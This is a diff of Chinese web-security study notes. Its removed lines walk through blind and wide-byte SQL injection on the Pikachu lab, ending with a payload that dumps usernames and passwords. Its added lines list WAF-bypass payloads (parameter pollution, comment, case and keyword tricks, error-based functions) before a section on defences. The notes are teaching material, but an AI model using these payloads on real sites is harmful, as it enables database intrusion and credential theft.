+-  协议未覆盖绕过waf，比如由于业务需要，只对get型进行检测，post数据选择忽略 
+-  参数污染，index?id=1&id=2 waf可能只对id=1进行检测
 
+**例：**<br />**服务器端有两个部分：**<br />第一部分为 tomcat 为引擎的 jsp 型服务器<br />第二部分为 apache 为引擎的 php 服务器<br />真正提供 web 服务的是 php 服务器。工作流程为：client 访问服务器， 能直接访问到 tomcat 服务器，然后 tomcat 服务器再向 apache 服务器请求数据。数据返回 路径则相反。<br />![](https://img-blog.csdnimg.cn/20200723152157998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=UhkL7&originHeight=492&originWidth=809&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
 
-# 基于boolian的盲注
+重点：index.php?id=1&id=2，你猜猜到底是显示 id=1 的数据还是显示 id=2 的？ Explain：apache（php）解析最后一个参数，即显示 id=2 的内容。Tomcat（jsp）解析第 一个参数，即显示 id=1 的内容。<br />![](https://img-blog.csdnimg.cn/20200723152230982.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=aUTkv&originHeight=323&originWidth=911&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
+以上图片为大多数服务器对于参数解析的介绍。
 
-## 查看关键代码
-```php
-$html='';if(isset($_GET['submit']) && $_GET['name']!=null){    $name=$_GET['name'];//这里没有做任何处理，直接拼到select里面去了    $query="select id,email from member where username='$name'";//这里的变量是字符型，需要考虑闭合    //mysqi_query不打印错误描述,即使存在注入,也不好判断    $result=mysqli_query($link, $query);////     $result=execute($link, $query);    if($result && mysqli_num_rows($result)==1){        while($data=mysqli_fetch_assoc($result)){            $id=$data['id'];            $email=$data['email'];            $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";        }    }else{        $html.="<p class='notice'>您输入的username不存在，请重新输入！</p>";    }}
-```
+**问题**：index.jsp?id=1&id=2 请求，针对第一张图中的服务器配置情况， 客户端请求首先过 tomcat，tomcat 解析第一个参数，接下来 tomcat 去请求 apache（php） 服务器，apache 解析最后一个参数。那最终返回客户端的应该是哪个参数？
 
-通过源码可以看到没有做任何处理，直接将name参数拼到select里面去存在注入，但是使用了mysqli_query不回显错误，很明显的盲注。
+**Answer**：此处应该是 id=2 的内容，因为实际上提供服务的是 apache（php）服务器， 返回的数据也应该是 apache 处理的数据。而在我们实际应用中，也是有两层服务器的情况， 那为什么要这么做？是因为我们往往在 tomcat 服务器处做数据过滤和处理，功能类似为一 个 WAF。而正因为解析参数的不同，我们此处可以利用该原理绕过 WAF 的检测。该用法就 是 HPP（HTTP Parameter Pollution），http 参数污染攻击的一个应用。HPP 可对服务器和客户端都能够造成一定的威胁。
 
+**练习地址：**[https://www.yuque.com/xmtxsec/blog/guysgs](https://www.yuque.com/xmtxsec/blog/guysgs)
+Sqli-Labs-29 <br />Sqli-Labs-30<br />Sqli-Labs-31
 
-## 实战
-在前面我们知道用户vince是存在的，输入
-```
-vince ' and 1=1# 成功显示用户信息vince ' and 1=2# 报错
-```
 
-说明存在注入
+### 3.2.4、规则层面的绕过
 
-判断数据库长度，输入
-```
-vince ' and length(database())=7# 成功显示用户信息vince ' and length(database())=8# 报错
-```
+-  sql注释符绕过 
+   1. union /_ _ /select 我们将union select之间的空格使用注释符进行替换（适用于对union select之间的空格进行检测的情况）
+   2. union/crow%0%32#/select 我们在注释符中间填充内容<br />union/aaaaaaaaaabbbbbbbbbcccccccccccdddddddddddeeeeeeeeeeee%%%%%%%%%/select 构造较大数据
+   3. /!union select/内联注释 我们使用内联注释，mysql特有
+-  空白符绕过 
+   1. mysql空白符：%09；%0A; %0B; %0D; %20; %0C; %A0; /XXX/
+   2. 正则空白符： %09；%0A; %0B; %0D; %20;<br />%25其实就是百分号 %25A0 就是空白符
+-  注释符绕过<br />//,-- , /**/, #, --+, -- -, ;,%00,
 
-说明数据库长度为7
+<br />**练习地址：**[https://www.yuque.com/xmtxsec/blog/guysgs](https://www.yuque.com/xmtxsec/blog/guysgs)
+Sqli-Labs-26<br />Sqli-Labs-27<br />Sqli-Labs-27a<br />Sqli-Labs-28<br />Sqli-Labs-28a 
 
-SQL注入详情可以看sqli-labs系类，这里不进行详细叙述。
 
+### 3.2.5、函数分割符号
 
-# 基于时间的盲注
+- 将一个函数进行分割concat()
+%25其实就是百分号 %25A0 就是空白符<br />concat%2520(<br />concat/**/(<br />concat%250c(<br />concat%25a0(
 
-## 查看关键代码
-```php
-$html='';if(isset($_GET['submit']) && $_GET['name']!=null){    $name=$_GET['name'];//这里没有做任何处理，直接拼到select里面去了    $query="select id,email from member where username='$name'";//这里的变量是字符型，需要考虑闭合    $result=mysqli_query($link, $query);//mysqi_query不打印错误描述//     $result=execute($link, $query);//    $html.="<p class='notice'>i don't care who you are!</p>";    if($result && mysqli_num_rows($result)==1){        while($data=mysqli_fetch_assoc($result)){            $id=$data['id'];            $email=$data['email'];            //这里不管输入啥,返回的都是一样的信息,所以更加不好判断            $html.="<p class='notice'>i don't care who you are!</p>";        }    }else{        $html.="<p class='notice'>i don't care who you are!</p>";    }}
-```
 
-通过源码可以看到和前面一样依然是没有做任何处理，就直接拼到select里面去了，不也一样的是在这里无论我们输入什么返回的结果都一样并且在这里有一个闭合的问题，可使用#号注释。所以只能使用时间盲注。
+### 3.2.6、浮点数法
 
+- waf对于id=1可以进行检测，但是对于id=1E0、id=1.0、id=\N可能就无法检测
 
-## 实战
-输入
-```
-vince' and sleep(5)#
-```
 
-发现页面延迟5秒才反应，说明存在注入
+### 3.2.7、利用error-based进行sql注入
 
-输入
-```
-vince' and if(length(database())=7,1,sleep(5))#  正常回显vince' and if(length(database())=8,1,sleep(5))#  延时5秒回显
-```
+- extractvalue(1, concat(0x5c,md5(3)));
+- updatexml(1, concat(0x5d,md5(3)),1);
+- GeometryCollection((selectfrom(selectfrom(select@@version)f)x))
+- polygon((select*from(select name_const(version(),1))x))
+- linestring()
+- multipoint()
+- multilinestring()
+- multipolygon()
 
-正常回显
 
-输入
-```
-vince' and if(substr((select database()),1,1)='p',1,sleep(5))#
-```
+### 3.2.8、mysql特殊语法
 
-正常回显说明数据库名称首字母为p
+- select {x schema_name} from {x information_schema.schemata};
+- select {x 1};
 
-SQL注入详情可以看sqli-labs系类，这里不进行详细叙述。
 
+### 3.2.9、大小写绕过
 
-# 宽字节注入
+- 如果对关键字and or union等进行了过滤，可以考虑使用大小写混合的方法`Or aNd UniOn`
 
-## 查看关键代码
-```php
-if(isset($_POST['submit']) && $_POST['name']!=null){    $name = escape($link,$_POST['name']);    $query="select id,email from member where username='$name'";//这里的变量是字符型，需要考虑闭合    //设置mysql客户端来源编码是gbk,这个设置导致出现宽字节注入问题    $set = "set character_set_client=gbk";    execute($link,$set);    //mysqi_query不打印错误描述    $result=mysqli_query($link, $query);    if(mysqli_num_rows($result) >= 1){        while ($data=mysqli_fetch_assoc($result)){            $id=$data['id'];            $email=$data['email'];            $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";        }    }else{        $html.="<p class='notice'>您输入的username不存在，请重新输入！</p>";    }}
-```
 
-通过查看源码可以知道对name参数进行了转义然后拼接到SQL语句中，而且需要考虑闭合，可使用#号注释，因为设置mysql客户端来源编码是gbk,所以导致出现宽字节注入问题。
+### 3.2.10、关键字重复
 
-```
-id=1’    =处理=>  1 \’  =进行编码=>  1%5c%27   =带入sql后=> id= \’ and XXXX    此时无法完成注入id=1%df’ =处理=> 1%df\’ =进行编码=> 1%df%5c%27 =带入sql后=> id=1運’ and XXX    此时存在宽字节注入漏洞
-```
+-  很多时候有函数会部分大小写进行过滤，这个时候我们可以考虑使用双写的方法`OORr = or`
 
+**练习地址：**[https://www.yuque.com/xmtxsec/blog/guysgs](https://www.yuque.com/xmtxsec/blog/guysgs)
+Sqli-Labs-25<br />Sqli-Labs-25a<br />Sqli-Labs-26 
 
-## 实战
-输入`vince`并使用burpsuite抓包<br />![image-20210707114902923.png](_img/02-Web安全/1655882654048-0ccf5706-2d4f-4113-85b0-5f14f7fc771e.png)
 
-输入
-```
-vince' or 1=1#      报错vince%df' or 1=1#   成功
-```
+### 3.2.11、关键字替换
 
-说明存在宽字节注入<br />![image-20210707115015053.png](_img/02-Web安全/1655882660630-70d05fe3-49d2-477b-8912-0f2adb5d4f02.png)
+-  `and = &&`、 `or = ||`、 `like可以替换 =`、 `<> 等价于 !=`，方法有很多，这里可能列举的不足。。。主要就是看谁思路更猥琐
 
-输入
-```
-vince%df' order by 2#  成功vince%df' order by 3#  失败
-```
+**练习地址：**[https://www.yuque.com/xmtxsec/blog/guysgs](https://www.yuque.com/xmtxsec/blog/guysgs)
+Sqli-Labs-25 
 
-说明存在两个字段
 
-查看当前数据库，输入
-```
-vince%df' union select 1,database()#
-```
-![image-20210707120331134.png](_img/02-Web安全/1655882669157-6df1120e-b42c-4d94-9ece-d6877d237ee0.png)
+## 3.2.12、fuzz测试
+可以使用burpsuite配合手工进行测试，后期测试成功后再用脚本进行处理。
 
-查看所有表，输入
-```
-vince%df'  union select version(),table_name from information_schema.tables where table_schema='pikachu'#
-```
 
-报错，将pikachu改为十六进制
-```
-vince%df'  union select version(),group_concat(table_name) from information_schema.tables where table_schema=0x70696b61636875#
-```
-![image-20210707141817629.png](_img/02-Web安全/1655882676239-180d6da6-c9ec-4017-b373-5224f7b496ca.png)
+# 四、SQL注入防御
 
-SQL注入详情可以看sqli-labs系类，这里不进行详细叙述，直接爆账号和密码了。
-```
-vince%df'  union select version(),group_concat(concat_ws(0x7e,username,password)) from pikachu.users#
-```
-![image-20210707142104543.png](_img/02-Web安全/1655882681954-0e246785-fd1e-4379-92f6-9ed2e9e66bf5.png)
+## 4.1、使用预编译语句
+一般来说，防御SQL注入的最佳方式，就是使用预编译语句，
+
+
+## 4.2、使用存储过程
+	除了使用预编译语句外，我们还可以使用安全的存储过程对抗SQL注入。使用存储过程的效果和使用预编语句译类似，其区别就是存储过程需要先将SQL语句定义在数据库中。但需要注意的是，存储过程中也可能会存在注入问题，因此应该尽量避免在存储过程内使用动态的SQL语句。如果无法避免，则应该使用严格的输入过滤或者是编码函数来处理用户的输入数据。
+
+
+## 4.3、检查数据类型
+	检查输入数据的数据类型，在很大程度上可以对抗SQL注入。
+
+
+## 4.4、使用安全函数
+	一般来说，各种Web语言都实现了一些编码函数，可以帮助对抗SQL注入。但前文曾举了一些编码函数被绕过的例子，因此我们需要一个足够安全的编码函数。
+
+
+## 4.5、最小化原则
+	从数据库自身的角度来说，应该使用最小权限原则，避免Web应用直接使用root、dbowner等 高权限账户直接连接数据库。如果有多个不同的应用在使用同一个数据库，则也应该为每个应用分配不同的账户。Web应用使用的数据库账户，不应该有创建自定义函数、操作本地文件的权限。
